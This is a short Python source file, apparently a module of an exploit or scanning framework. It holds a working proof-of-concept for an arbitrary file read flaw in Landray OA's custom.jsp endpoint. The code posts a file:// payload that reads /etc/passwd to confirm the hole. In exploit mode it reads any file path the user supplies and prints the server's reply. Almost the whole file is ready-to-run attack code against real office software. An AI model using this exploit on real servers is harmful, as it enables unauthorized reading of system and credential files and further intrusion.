class WeaverOA():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.flag = GlobalVar.get_value('flag')
            
    def LandrayOA_custom_file_reading(self):
        appName = 'WeaverOA'
        pocname = 'LandrayOA_custom_file_reading'
        path = '/sys/ui/extend/varkind/custom.jsp'
        method = 'post'
        desc = '[file reading] app="Landray"'
        data = 'var={"body":{"file":"file://RECOMMAND"}}'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.post(
                    url=self.url+path, 
                    data=data.replace('RECOMMAND','/etc/passwd'), 
                    headers=headers,
                    )
                if r"root:" in r.text:
                    return output.no_echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.post(
                    url=self.url+path,
                    data=data.replace('RECOMMAND',self.cmd), 
                    headers=headers,
                    ).text
                print(result.strip('\r\n'))
        except Exception as error:
            return output.error_output(str(error))

